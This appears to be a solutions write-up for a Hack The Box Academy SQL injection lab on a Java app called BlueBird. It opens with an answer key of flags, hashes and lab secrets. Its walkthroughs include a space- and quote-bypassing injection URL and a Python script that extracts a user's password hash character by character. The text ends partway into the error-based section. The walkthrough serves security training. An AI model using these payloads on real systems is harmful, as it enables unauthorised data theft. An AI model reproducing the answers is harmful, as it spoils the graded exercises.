| Section                    | Question Number | Answer                                                                  |
| -------------------------- | --------------- | ----------------------------------------------------------------------- |
| Introduction to PostgreSQL | Question 1      | 4                                                                       |
| Introduction to PostgreSQL | Question 2      | 390                                                                     |
| Introduction to PostgreSQL | Question 3      | aealvarado28@acme.corp                                                  |
| Introduction to PostgreSQL | Question 4      | 107000                                                                  |
| Decompiling Java Archives  | Question 1      | 72Ao88agtuOFT7PerfCtF80qzuyK1sEa                                        |
| Searching for Strings      | Question 1      | passwordHash                                                            |
| Hunting for SQL Errors     | Question 1      | PostgreSQL JDBC Driver                                                  |
| Common Character Bypasses  | Question 1      | $2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq            |
| Error-Based SQL Injection  | Question 1      | https://bluebird.htb/reset?uid=10&code=8eecaa80ca8f05273ecbe256e87e9c56 |
| Second-Order SQL Injection | Question 1      | $2b$12$V5XNBDjsjG9cbyYOB3Kmk.j36jEydVhXIegPpo4HTz7ehiodG1E8O            |
| Reading and Writing Files  | Question 1      | HTB{8c03f71890a8919c84626cef49576e3f}                                   |
| Command Execution          | Question 1      | HTB{f9141e0c21d27c56cfdb812960d4e7c3}                                   |
| Skills Assessment          | Question 1      | HTB{f69c870dbf86628cdf7e3ad1a58dbac1}                                   |
| Skills Assessment          | Question 2      | HTB{6572f826fbab3708e9b20a3c993d1ef7}                                   |

## Acronyms Used in Writeups

| Acronym | Meaning |
| --- | --- |
| STMIP | Spawned Target Machine IP Address |
| STMPO | Spawned Target Machine Port |
| PMVPN | Personal Machine with a Connection to the Academy's VPN |
| PWNIP | Pwnbox IP Address (or PMVPN IP Address) |
| PWNPO | Pwnbox Port (or PMVPN Port) |

# Introduction to PostgreSQL

## Question 1

### "What is the ID of the Information Technology department?"

First, if not installed, students need to install `postgresql-client-13`:

Code: shell

```shell
sudo apt install postgresql-client-13
```

```
┌─[us-academy-1]─[10.10.15.70]─[htb-ac413848@htb-3ye2vfpgpq]─[~]
└──╼ [★]$ sudo apt install postgresql-client-13

Reading package lists... Done
Building dependency tree... Done
Reading state information... Done
The following packages were automatically installed and are no longer required:
  libgit2-1.1 libmbedcrypto3 libmbedtls12 libmbedx509-0 libstd-rust-1.48 libstd-rust-dev linux-kbuild-5.18 rust-gdb
Use 'sudo apt autoremove' to remove them.
The following additional packages will be installed:
  libpq5
Suggested packages:
  postgresql-doc-13
The following packages will be upgraded:
  libpq5 postgresql-client-13
2 upgraded, 0 newly installed, 0 to remove and 106 not upgraded.
Need to get 1,693 kB of archives.
After this operation, 7,168 B of additional disk space will be used.
Do you want to continue? [Y/n] Y
<SNIP>
```

Subsequently, students need to connect to the `PostgreSQL` server using the credentials `acdbuser:AcmeCorp2023!` and specify the landing database name as `acmecorp`:

Code: shell

```shell
psql -h STMIP -p STMPO -U acdbuser acmecorp
```

```
┌─[us-academy-1]─[10.10.14.164]─[htb-ac413848@htb-jphfq5vbyd]─[~]
└──╼ [★]$ psql -h 209.97.129.77 -p 32452 -U acdbuser acmecorp

Password for user acdbuser: 
psql (13.10 (Debian 13.10-0+deb11u1), server 13.9 (Debian 13.9-0+deb11u1))
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

acmecorp=>
```

Then, students need to list the available tables within the database, finding `departments`:

Code: sql

```sql
\dt
```

Code: sql

```sql
acmecorp=> \dt

            List of relations
 Schema |    Name     | Type  |  Owner   
--------+-------------+-------+----------
 public | departments | table | postgres
 public | dept_emp    | table | postgres
 public | employees   | table | postgres
 public | salaries    | table | postgres
 public | titles      | table | postgres
(5 rows)
```

To query the table, students first need to know its columns, finding the one of interest to be named `id`:

Code: sql

```sql
\d+ departments
```

Code: sql

```sql
acmecorp=> \d+ departments

                                                        Table "public.departments"
 Column |          Type          | Collation | Nullable |                 Default                 | Storage  | Stats target | Description 
--------+------------------------+-----------+----------+-----------------------------------------+----------+--------------+-------------
 id     | integer                |           | not null | nextval('departments_id_seq'::regclass) | plain    |              | 
 name   | character varying(100) |           | not null |                                         | extended |              | 
Indexes:
    "departments_pkey" PRIMARY KEY, btree (id)
Referenced by:
    TABLE "dept_emp" CONSTRAINT "dept_emp_dept_id_fkey" FOREIGN KEY (dept_id) REFERENCES departments(id)
Access method: heap
```

At last, students need to retrieve the `id` from the `departments` table having the name `Information Technology`, to attain the result `4`:

Code: sql

```sql
SELECT id FROM departments WHERE name = 'Information Technology';
```

Code: sql

```sql
acmecorp=> SELECT id FROM departments WHERE name = 'Information Technology';
 
 id 
----
  4
(1 row)
```

Answer: `4`

# Introduction to PostgreSQL

## Question 2

### "How many employees work in this department?"

Using the same connection to the `PostgreSQL` server from the previous question, students already know that there is a table named `dept_emp`:

Code: sql

```sql
\dt
```

Code: sql

```sql
acmecorp=> \dt

            List of relations
 Schema |    Name     | Type  |  Owner   
--------+-------------+-------+----------
 public | departments | table | postgres
 public | dept_emp    | table | postgres
 public | employees   | table | postgres
 public | salaries    | table | postgres
 public | titles      | table | postgres
(5 rows)
```

To query the table, students first need to know its columns, finding the ones of interest to be named `emp_id` and `dept_id`:

Code: sql

```sql
acmecorp=> \d+ dept_emp 

Table "public.dept_emp"
  Column   |  Type   | Collation | Nullable | Default | Storage | Stats target | Description 
-----------+---------+-----------+----------+---------+---------+--------------+-------------
 emp_id    | integer |           | not null |         | plain   |              | 
 dept_id   | integer |           | not null |         | plain   |              | 
 from_date | date    |           | not null |         | plain   |              | 
 to_date   | date    |           |          |         | plain   |              | 
Foreign-key constraints:
    "dept_emp_dept_id_fkey" FOREIGN KEY (dept_id) REFERENCES departments(id)
    "dept_emp_emp_id_fkey" FOREIGN KEY (emp_id) REFERENCES employees(id)
Access method: heap
```

At last, students need to use the `COUNT()` function on the `emp_id` column in the `dept_emp` table where the department ID is `4` (i.e., the ID of the table `Information Technology`), to attain a total of `390` employees that work in the `Information Technology` department:

Code: sql

```sql
SELECT COUNT(emp_id) FROM dept_emp WHERE dept_id = 4;
```

Code: sql

```sql
acmecorp=> SELECT COUNT(emp_id) FROM dept_emp WHERE dept_id = 4;
 
 count 
-------
   390
(1 row)
```

Answer: `390`

# Introduction to PostgreSQL

## Question 3

### "What is the email of the most recently hired employee in the Information Technology department?"

Using the same connection to the `PostgreSQL` server from the first question, students already know that there is a table named `dept_emp`:

Code: sql

```sql
\dt
```

Code: sql

```sql
acmecorp=> \dt

            List of relations
 Schema |    Name     | Type  |  Owner   
--------+-------------+-------+----------
 public | departments | table | postgres
 public | dept_emp    | table | postgres
 public | employees   | table | postgres
 public | salaries    | table | postgres
 public | titles      | table | postgres
(5 rows)
```

Additionally, students know that it contains the column `dept_id` that stores the department ID of an employee:

Code: sql

```sql
\d+ dept_emp
```

Code: sql

```sql
acmecorp=> \d+ dept_emp

Table "public.dept_emp"
  Column   |  Type   | Collation | Nullable | Default | Storage | Stats target | Description 
-----------+---------+-----------+----------+---------+---------+--------------+-------------
 emp_id    | integer |           | not null |         | plain   |              | 
 dept_id   | integer |           | not null |         | plain   |              | 
 from_date | date    |           | not null |         | plain   |              | 
 to_date   | date    |           |          |         | plain   |              | 
Foreign-key constraints:
    "dept_emp_dept_id_fkey" FOREIGN KEY (dept_id) REFERENCES departments(id)
    "dept_emp_emp_id_fkey" FOREIGN KEY (emp_id) REFERENCES employees(id)
Access method: heap
```

However, the email address and hire date of an employee are saved within the `employees` table as `email` and `hire_date`, respectively:

Code: sql

```sql
\d+ employees
```

Code: sql

```sql
acmecorp=> \d+ employees

Table "public.employees"
   Column   |          Type          | Collation | Nullable |                Default                | Storage  | Stats target | Description 
------------+------------------------+-----------+----------+---------------------------------------+----------+--------------+---
 id         | integer                |           | not null | nextval('employees_id_seq'::regclass) | plain    |              | 
 username   | character varying(32)  |           | not null |                                       | extended |              | 
 email      | character varying(100) |           | not null |                                       | extended |              | 
 password   | character varying(72)  |           | not null |                                       | extended |              | 
 first_name | character varying(32)  |           | not null |                                       | extended |              | 
 last_name  | character varying(32)  |           | not null |                                       | extended |              | 
 birth_date | date                   |           | not null |                                       | plain    |              | 
 hire_date  | date                   |           | not null |                                       | plain    |              | 
Indexes:
    "employees_pkey" PRIMARY KEY, btree (id)
    "employees_email_key" UNIQUE CONSTRAINT, btree (email)
    "employees_username_key" UNIQUE CONSTRAINT, btree (username)
Referenced by:
    TABLE "dept_emp" CONSTRAINT "dept_emp_emp_id_fkey" FOREIGN KEY (emp_id) REFERENCES employees(id)
    TABLE "salaries" CONSTRAINT "salaries_emp_id_fkey" FOREIGN KEY (emp_id) REFERENCES employees(id)
    TABLE "titles" CONSTRAINT "titles_emp_id_fkey" FOREIGN KEY (emp_id) REFERENCES employees(id)
Access method: heap
```

Therefore, to attain the email of the most recently hired employee in the `Information Technology` department, students need to perform an `inner JOIN` between `employees` and `dept_emp` on the primary key `id` of `employees` and the foreign key `emp_id` of `dept_emp`, specifying `dept_id` to be `4` (i.e., the ID of the table `Information Technology`) and ordering the results based on `hire_date` descendingly; students will attain the email address `aealvarado28@acme.corp`:

Code: sql

```sql
SELECT email FROM employees JOIN dept_emp ON employees.id = dept_emp.emp_id WHERE dept_id = 4 ORDER BY hire_date DESC LIMIT 1;
```

Code: sql

```sql
acmecorp=> SELECT email FROM employees JOIN dept_emp ON employees.id = dept_emp.emp_id WHERE dept_id = 4 ORDER BY hire_date DESC LIMIT 1;
         
         email          
------------------------
 aealvarado28@acme.corp
(1 row)
```

Answer: `aealvarado28@acme.corp`

# Introduction to PostgreSQL

## Question 4

### "What is the salary of the second-lowest paid employee in the Information Technology department with the first name 'William'?"

Using the same connection to the `PostgreSQL` server from the first question, students already know that there is a table named `salaries`:

Code: sql

```sql
acmecorp=> \dt
```

Code: sql

```sql
acmecorp=> \dt

            List of relations
 Schema |    Name     | Type  |  Owner   
--------+-------------+-------+----------
 public | departments | table | postgres
 public | dept_emp    | table | postgres
 public | employees   | table | postgres
 public | salaries    | table | postgres
 public | titles      | table | postgres
(5 rows)
```

To query the table, students first need to know its columns, finding the one of interest to be named `salary`:

Code: sql

```sql
\d+ salaries
```

Code: sql

```sql
acmecorp=> \d+ salaries

Table "public.salaries"
  Column   |  Type   | Collation | Nullable | Default | Storage | Stats target | Description 
-----------+---------+-----------+----------+---------+---------+--------------+-------------
 emp_id    | integer |           | not null |         | plain   |              | 
 salary    | integer |           | not null |         | plain   |              | 
 from_date | date    |           | not null |         | plain   |              | 
 to_date   | date    |           |          |         | plain   |              | 
Foreign-key constraints:
    "salaries_emp_id_fkey" FOREIGN KEY (emp_id) REFERENCES employees(id)
Access method: heap
```

Additionally, students already know that the `employees` and `dept_emp` tables contain the columns `first_name` and `dept_id`, respectively. Therefore, to attain the salary of the second-lowest paid employee in the Information Technology department with the first name 'William', students need to perform an `inner JOIN` between the three tables, `employees`, `dept_emp`, and `salaries`, on the primary key `id` of `employees` and the foreign key `emp_id` of `dept_emp`, and the foreign key `emp_id` of `dept_emp` and the foreign key `emp_id` of `salaries` , specifying `dept_id` to be `4` (i.e., the ID of the table `Information Technology`), `first_name` to be `William`, and ordering the results based on `salary` descendingly; students will attain the salary `107000`:

Code: sql

```sql
SELECT salary FROM employees JOIN dept_emp ON employees.id = dept_emp.emp_id JOIN salaries ON dept_emp.emp_id = salaries.emp_id WHERE dept_emp.dept_id = 4 AND first_name = 'William' ORDER BY salary ASC LIMIT 2;
```

Code: sql

```sql
acmecorp=> SELECT salary FROM employees JOIN dept_emp ON employees.id = dept_emp.emp_id JOIN salaries ON dept_emp.emp_id = salaries.emp_id WHERE dept_emp.dept_id = 4 AND first_name = 'William' ORDER BY salary ASC LIMIT 2;

 salary 
--------
  43000
 107000
(2 rows)
```

Answer: `107000`

# Decompiling Java Archives

## Question 1

### "Connect to the testing VM and download the BlueBird JAR file from /opt/bluebird. Use either FernFlower or JD-GUI to decompile and save the source files. What is the value of 'bluebird.app.jwtSecret' in 'application.properties'?"

After spawning the target machine, students need to download the directory `/opt/blurbird` from it using `scp` with the credentials `student:academy.hackthebox.com`, clone a mirror of [Fernflower](https://github.com/fesh0r/fernflower.git), install `openjdk-17-jdk` and set it as the default `JDK`, build `Fernflower` and use it to decompile `BlueBird-0.0.1-SNAPSHOT.jar`, extract all the source `.java` files, and then use `VS Code` to analyze the source code:

Code: shell

```shell
scp -r student@STMIP:/opt/bluebird ./
git clone https://github.com/fesh0r/fernflower.git
sudo apt install openjdk-17-jdk -y
sudo update-java-alternatives --set /usr/lib/jvm/java-1.17.0-openjdk-amd64
cd fernflower/
./gradlew build -x test
cd ..
mkdir BlueBirdSourceCode/
java -jar ./fernflower/build/libs/fernflower.jar ./bluebird/BlueBird-0.0.1-SNAPSHOT.jar BlueBirdSourceCode/
cd BlueBirdSourceCode/
jar -xf BlueBird-0.0.1-SNAPSHOT.jar
code ./BOOT-INF/classes/
```

```
┌─[us-academy-1]─[10.10.14.9]─[htb-ac-413848@htb-bgt7wim7cy]─[~]
└──╼ [★]$ scp -r student@10.129.204.249:/opt/bluebird ./
git clone https://github.com/fesh0r/fernflower.git
sudo apt install openjdk-17-jdk -y
sudo update-java-alternatives --set /usr/lib/jvm/java-1.17.0-openjdk-amd64
cd fernflower/
./gradlew build -x test
cd ..
mkdir BlueBirdSourceCode/
java -jar ./fernflower/build/libs/fernflower.jar ./bluebird/BlueBird-0.0.1-SNAPSHOT.jar BlueBirdSourceCode/
cd BlueBirdSourceCode/
jar -xf BlueBird-0.0.1-SNAPSHOT.jar
code ./BOOT-INF/classes/

The authenticity of host '10.129.204.249 (10.129.204.249)' can't be established.
ECDSA key fingerprint is SHA256:H3dchF69KY5+78o0pNtz2FCTJK5zJaExATyEcGhDhwA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.204.249' (ECDSA) to the list of known hosts.
student@10.129.204.249's password: 
BlueBird-0.0.1-SNAPSHOT.jar                                                                                                                                                      100%   45MB  19.2MB/s   00:02    
serverInfo.sh                                                                                                                                                                    100%  427    85.0KB/s   00:00    
postgresql-2023-03-10_133306.log                                                                                                                                                 100%  155KB   4.2MB/s   00:00    
postgresql-2023-03-22_144521.log                                                                                                                                                 100% 8124   227.2KB/s   00:00    
postgresql-2023-03-14_144813.log                                                                                                                                                 100% 9969   440.5KB/s   00:00    
postgresql-2023-03-15_051722.log                                                                                                                                                 100%   13KB 445.3KB/s   00:00    
Cloning into 'fernflower'...

<SNIP>
```

![[HTB Solutions/CWEE/z. images/f23ceee57e3a2c3df40eb833448e207f_MD5.jpg]]

When viewing the file `application.properties`, students will find that the value of `bluebird.app.jwtSecret` is `72Ao88agtuOFT7PerfCtF80qzuyK1sEa`:

![[HTB Solutions/CWEE/z. images/aaeac98eb7596b74088aad90f395acba_MD5.jpg]]

Answer: `72Ao88agtuOFT7PerfCtF80qzuyK1sEa`

# Searching for Strings

## Question 1

### "Inside AuthController.java there is an SQL injection vulnerability within an INSERT query. Which variable can NOT be used for exploitation?"

After spawning the target machine, students need to download the directory `/opt/blurbird` from it using `scp` with the credentials `student:academy.hackthebox.com`, clone a mirror of [Fernflower](https://github.com/fesh0r/fernflower.git), install `openjdk-17-jdk` and set it as the default `JDK`, build `Fernflower` and use it to decompile `BlueBird-0.0.1-SNAPSHOT.jar`, extract all the source `.java` files, and then use `code` to analyze the source code:

Code: shell

```shell
scp -r student@STMIP:/opt/bluebird ./
git clone https://github.com/fesh0r/fernflower.git
sudo apt install openjdk-17-jdk -y
sudo update-java-alternatives --set /usr/lib/jvm/java-1.17.0-openjdk-amd64
cd fernflower/
./gradlew build -x test
cd ..
mkdir BlueBirdSourceCode/
java -jar ./fernflower/build/libs/fernflower.jar ./bluebird/BlueBird-0.0.1-SNAPSHOT.jar BlueBirdSourceCode/
cd BlueBirdSourceCode/
jar -xf BlueBird-0.0.1-SNAPSHOT.jar
code ./BOOT-INF/classes/
```

```
┌─[us-academy-1]─[10.10.14.9]─[htb-ac-413848@htb-bgt7wim7cy]─[~]
└──╼ [★]$ scp -r student@10.129.204.249:/opt/bluebird ./
git clone https://github.com/fesh0r/fernflower.git
sudo apt install openjdk-17-jdk -y
sudo update-java-alternatives --set /usr/lib/jvm/java-1.17.0-openjdk-amd64
cd fernflower/
./gradlew build -x test
cd ..
mkdir BlueBirdSourceCode/
java -jar ./fernflower/build/libs/fernflower.jar ./bluebird/BlueBird-0.0.1-SNAPSHOT.jar BlueBirdSourceCode/
cd BlueBirdSourceCode/
jar -xf BlueBird-0.0.1-SNAPSHOT.jar
code ./BOOT-INF/classes/

The authenticity of host '10.129.204.249 (10.129.204.249)' can't be established.
ECDSA key fingerprint is SHA256:H3dchF69KY5+78o0pNtz2FCTJK5zJaExATyEcGhDhwA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.204.249' (ECDSA) to the list of known hosts.
student@10.129.204.249's password: 
BlueBird-0.0.1-SNAPSHOT.jar                                                                                                                                                      100%   45MB  19.2MB/s   00:02    
serverInfo.sh                                                                                                                                                                    100%  427    85.0KB/s   00:00    
postgresql-2023-03-10_133306.log                                                                                                                                                 100%  155KB   4.2MB/s   00:00    
postgresql-2023-03-22_144521.log                                                                                                                                                 100% 8124   227.2KB/s   00:00    
postgresql-2023-03-14_144813.log                                                                                                                                                 100% 9969   440.5KB/s   00:00    
postgresql-2023-03-15_051722.log                                                                                                                                                 100%   13KB 445.3KB/s   00:00    
Cloning into 'fernflower'...

<SNIP>
```

To find the `INSERT` statement the question is asking about, students can utilize the search functionality of `code` (`Ctrl` + `F`) and look for the string `INSERT`, which navigates to a SQL query stored inside a string named `sql`:

Code: java

```java
String sql = "INSERT INTO users (name, username, email, password) VALUES ('" + name + "', '" + username + "', '" + email + "', '" + passwordHash + "')";
```

![[HTB Solutions/CWEE/z. images/291b43b4b0a5963e766d9e9f1a6e629d_MD5.jpg]]

Students will notice that the endpoint accepts the POST parameters `name`, `username`, `email`, and `password` from the sender of the request and directly concatenates them in the SQL query without sanitization; however, for `passwordHash`, it cannot be abused for injection as it is not accepted as a POST parameter from the sender, regardless of it being directly concatenated into the SQL query. Moreover, the backend initializes the value of `passwordHash` by using parameterized queries:

![[HTB Solutions/CWEE/z. images/0cf060b75cdeaa64cfacd102964bc848_MD5.jpg]]

Answer: `passwordHash`

# Hunting for SQL Errors

## Question 1

### "PostgreSQL logging has already been enabled on the testing VM. Check the log files and find the value 'application\_name' is set to when BlueBird starts up."

After spawning the target machine, students need to SSH into it with the credentials `student:academy.hackthebox.com`:

Code: shell

```shell
ssh student@STMIP
```

```
┌─[us-academy-1]─[10.10.14.9]─[htb-ac-413848@htb-bgt7wim7cy]─[~]
└──╼ [★]$ ssh student@10.129.204.249

student@10.129.204.249's password: 
Linux bb01 5.10.0-21-amd64 #1 SMP Debian 5.10.162-1 (2023-01-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Tue Feb 28 16:55:11 2023 from 192.168.0.122
student@bb01:~$
```

Subsequently, students need to `grep` for `application_name` in the log files within `/opt/bluebird/pg_log/`, finding its value to be `PostgreSQL JDBC Driver`:

Code: shell

```shell
grep -i "application_name" -r /opt/bluebird/pg_log/ -m 1 | head -n 1
```

```
student@bb01:~$ grep -i "application_name" -r /opt/bluebird/pg_log/ -m 1 | head -n 1

grep: /opt/bluebird/pg_log/postgresql-2023-03-10_133306.log: binary file matches
/opt/bluebird/pg_log/postgresql-2023-03-22_144521.log:2023-03-22 14:45:37.995 EDT [1072] bbuser@bluebird LOG:  execute <unnamed>: SET application_name = 'PostgreSQL JDBC Driver'
```

Answer: `PostgreSQL JDBC Driver`

# Common Character Bypasses

## Question 1

### "Use any of the techniques to exploit this SQL injection vulnerability on the target over port 8080. What is the password hash of the user whose email is Amy.Mcwilliams@proton.me?"

After spawning the target machine, students need to navigate to its website's root webpage and click on "Sign up" to create an account:

![[HTB Solutions/CWEE/z. images/0dfcc439d7930ccec067d57d17763b5e_MD5.jpg]]

Students can fill the form with any arbitrary data:

![[HTB Solutions/CWEE/z. images/b4119497c36e9e8499c154f87bac65f1_MD5.jpg]]

After creating the account, students will be redirected to log in:

![[HTB Solutions/CWEE/z. images/0eda52cfaad0f14f36f667ad5eecd47a_MD5.jpg]]

![[HTB Solutions/CWEE/z. images/1756c7570bfc770f866a0c16522f4a7d_MD5.jpg]]

From the section's reading, students know that the POST `/find-user` endpoint suffers from a SQLi, as it concatenates the value of the user-supplied POST parameter `u` into the SQL query, if and only if it does not contain spaces and matches the `regex` pattern `'|(.*'.*'.*)`:

![[HTB Solutions/CWEE/z. images/0a445d9a46dd08609d4629dcbea0ebc1_MD5.jpg]]

However, the function `Matcher.matches()` returns `true` only if the entire value of `u` matches the pattern stored in `p`, otherwise it returns `false`, therefore, students can bypass this by passing a payload such as `'a`. For bypassing white-spaces, students need to use [PostgreSQL's multi-line comments](https://www.postgresql.org/docs/current/sql-syntax-lexical.html#SQL-SYNTAX-COMMENTS) `/**/`, as they will be evaluated by the query to whitespace (note that strings/characters can be contained within the multiline comments, as in `/*willBeDeleted*/` or `/*-*/`):

![[HTB Solutions/CWEE/z. images/0d57255c1617cedc69acc2b73878e816_MD5.jpg]]

Additionally, from the section's reading, students know that result of the query ran by `/find-user` gets used by `Thymeleaf` to populate the `users` attribute when looping through all the users. Thus, students need to build the SQL injection payload such that its value gets assigned the attributes of the `User` model (the `id` attribute will be used), so that when `Thymeleaf` invokes the getter `user.getId()`, the SQL injection payload gets returned instead:

![[HTB Solutions/CWEE/z. images/cff48c865d771975cacfef35fee37193_MD5.jpg]]

Students can test the endpoint by injecting a payload that will assign `id` the value of the first character of the password of the user with the email `Amy.Mcwilliams@proton.me`, getting back 36 in the `anchor` tag populated by `Thymeleaf`, which is the ASCII encoding of `$`:

```
http://STMIP:8080/find-user?u=%27/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,1,1))/**/FROM/**/users/**/WHERE/**/email=$$Amy.Mcwilliams@proton.me$$)--
```

![[HTB Solutions/CWEE/z. images/c67f0e21765d3ddd79c10916dafd62e8_MD5.jpg]]

Now that students have identified the attack vector, they need to automate the exfiltration of data from the database using it. To get the value assigned by `Thymeleaf` to `href="/profile/VALUE"`, students can either use an HTML parser such as [BeautifulSoup](https://www.crummy.com/software/BeautifulSoup/bs4/doc/) to parse out the value of the `href` attribute within the `anchor` tag, or, a simpler approach is using `matching groups` in `regex`. Since the pattern is uniform every time as `Thymeleaf` is used, students can attain the value assigned to `id` by the injected query via the `regular expression` adapted in Python:

Code: python

```python
regex = r"(<a style=\"text-decoration:none; color: white\" href=\"/profile/)(.*?)(\">)"
match = re.search(regex, response.text) 
    if match:
        return match.group(2)
```

![[HTB Solutions/CWEE/z. images/d09af8bb112376fd10c3443feb18bb2e_MD5.jpg]]

Additionally, in the PoC script, students need to include the `auth` `Cookie` header as it is required, not forgetting to also replace whitespaces with `/**/` and single quotes with `$$`:

![[HTB Solutions/CWEE/z. images/1d4010f244a206be1a9158546382422a_MD5.jpg]]

First, students need to inject a query to fetch the length of the password's hash of the user with the email `Amy.McWilliams@proton.me`:

Code: sql

```sql
SELECT LENGTH(password) FROM users WHERE email = 'Amy.Mcwilliams@proton.me'
```

Code: python

```python
import requests
import re

def oracle(query):
    headers = {"Cookie": "auth=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJCbHVlU2hhcmsiLCJpYXQiOjE2Nzk1MTgwODAsImV4cCI6MTY3OTUyNjcyMH0.TuiqKiE-w14RJUY1bxVrPHb7kLdpM5_HpS9cnDWZS8OfuEA4FMBE4AMTk7WJJw_o9z4DwExIbNeA_oIXSnmi5g"}
    whiteSpace = "/**/"
    singleQuote = "$$"
    baseURL = "http://STMIP:8080/find-user?u="
    SQLiPayload = (f''''{whiteSpace}AND{whiteSpace}id=({query.replace("'", singleQuote).replace(" ", whiteSpace)})--''')
    response = requests.get(baseURL + SQLiPayload, headers = headers)
    regex = r"(<a style=\"text-decoration:none; color: white\" href=\"/profile/)(.*?)(\">)"
    match = re.search(regex, response.text) 
    if match:
        return match.group(2)

print(oracle(f"SELECT LENGTH(password) FROM users WHERE email = 'Amy.Mcwilliams@proton.me'"))
```

Students will find that it is `60` characters long (as it is hashed with the [bcrypt algorithm](https://auth0.com/blog/hashing-in-action-understanding-bcrypt/)):

```
┌─[us-academy-1]─[10.10.15.70]─[htb-ac413848@htb-npmotne92n]─[~]
└──╼ [★]$ python3 poc.py 

60
```

Since the password's hash length is 60, students need to adapt the script to exfiltrate each character one by one, making sure that the ASCII encoded characters are decoded to their text representative:

Code: sql

```sql
SELECT ASCII(SUBSTRING(password, {i}, 1)) FROM users WHERE email = 'Amy.Mcwilliams@proton.me'
```

Code: python

```python
import requests
import re

def oracle(query):
    headers = {"Cookie": "auth=eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiJCbHVlU2hhcmsiLCJpYXQiOjE2Nzk1MTgwODAsImV4cCI6MTY3OTUyNjcyMH0.TuiqKiE-w14RJUY1bxVrPHb7kLdpM5_HpS9cnDWZS8OfuEA4FMBE4AMTk7WJJw_o9z4DwExIbNeA_oIXSnmi5g"}
    whiteSpace = "/**/"
    singleQuote = "$$"
    baseURL = "http://STMIP:8080/find-user?u="
    SQLiPayload = (f''''{whiteSpace}AND{whiteSpace}id=({query.replace("'", singleQuote).replace(" ", whiteSpace)})--''')
    response = requests.get(baseURL + SQLiPayload, headers = headers)
    regex = r"(<a style=\"text-decoration:none; color: white\" href=\"/profile/)(.*?)(\">)"
    match = re.search(regex, response.text) 
    if match:
        return match.group(2)

passwordHash = ""
for i in range(1, 61):
    passwordHash += chr(int(oracle(f"SELECT ASCII(SUBSTRING(password, {i}, 1)) FROM users WHERE email = 'Amy.Mcwilliams@proton.me'")))
print(passwordHash)
```

After running the script, students will know that the password's hash of the user with the email `Amy.Mcwilliams@proton.me` is `$2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq`:

```
┌─[us-academy-1]─[10.10.15.70]─[htb-ac413848@htb-npmotne92n]─[~]
└──╼ [★]$ python3 poc.py

$2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq
```

Answer: `$2b$12$XY8x59PEZ5YzV8a9O8V9uuxNadTgHRzu0RI9OaNet5k.mp3w7m3Tq`

# Error-Based SQL Injection

## Question 1

### "Take a look at how the password-reset links are generated in forgotPOST(). Use the error-based SQLi to dump the required information on the target over port 8080, and enter what the value of 'passwordResetLink' for the user 'potus4' would be."

After spawning the target machine, students need to download the directory `/opt/blurbird` from it using `scp` with the credentials `student:academy.hackthebox.com`, clone a mirror of [Fernflower](https://github.com/fesh0r/fernflower.git), install `openjdk-17-jdk` and set it as the default `JDK`, build `Fernflower` and use it to decompile `BlueBird-0.0.1-SNAPSHOT.jar`, extract all the source `.java` files, and then use `code` to analyze the source code:

Code: shell

```shell
scp -r student@STMIP:/opt/bluebird ./
git clone https://github.com/fesh0r/fernflower.git
sudo apt install openjdk-17-jdk -y
sudo update-java-alternatives --set /usr/lib/jvm/java-1.17.0-openjdk-amd64
cd fernflower/
./gradlew build -x test
cd ..
mkdir BlueBirdSourceCode/
java -jar ./fernflower/build/libs/fernflower.jar ./bluebird/BlueBird-0.0.1-SNAPSHOT.jar BlueBirdSourceCode/
cd BlueBirdSourceCode/
jar -xf BlueBird-0.0.1-SNAPSHOT.jar
code ./BOOT-INF/classes/
```

```
┌─[us-academy-1]─[10.10.14.9]─[htb-ac-413848@htb-bgt7wim7cy]─[~]
└──╼ [★]$ scp -r student@10.129.204.249:/opt/bluebird ./
git clone https://github.com/fesh0r/fernflower.git
sudo apt install openjdk-17-jdk -y
sudo update-java-alternatives --set /usr/lib/jvm/java-1.17.0-openjdk-amd64
cd fernflower/
./gradlew build -x test
cd ..
mkdir BlueBirdSourceCode/
java -jar ./fernflower/build/libs/fernflower.jar ./bluebird/BlueBird-0.0.1-SNAPSHOT.jar BlueBirdSourceCode/
cd BlueBirdSourceCode/
jar -xf BlueBird-0.0.1-SNAPSHOT.jar
code ./BOOT-INF/classes/
The authenticity of host '10.129.204.249 (10.129.204.249)' can't be established.
ECDSA key fingerprint is SHA256:H3dchF69KY5+78o0pNtz2FCTJK5zJaExATyEcGhDhwA.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.129.204.249' (ECDSA) to the list of known hosts.
student@10.129.204.249's password: 
BlueBird-0.0.1-SNAPSHOT.jar                                                                                                                                                      100%   45MB  19.2MB/s   00:02    
serverInfo.sh                                                                                                                                                                    100%  427    85.0KB/s   00:00    
postgresql-2023-03-10_133306.log                                                                                                                                                 100%  155KB   4.2MB/s   00:00    
postgresql-2023-03-22_144521.log                                                                                                                                                 100% 8124   227.2KB/s   00:00    
postgresql-2023-03-14_144813.log                                                                                                                                                 100% 9969   440.5KB/s   00:00    
postgresql-2023-03-15_051722.log                                                                                                                                                 100%   13KB 445.3KB/s   00:00    
Cloning into 'fernflower'...

<SNIP>
```

When checking how `passwordResetHash` is populated by the POST `/forgot` endpoint in line 138 of `AuthController.java`, students will come to know that the hardcoded string `https://bluebird.htb/reset?uid=` is added to `var10000` which is the `id` of the user, then the value of `passwordResetHash` gets added afterward:

![[HTB Solutions/CWEE/z. images/273b4bde45fecc2472b936e8aee1e9d0_MD5.jpg]]

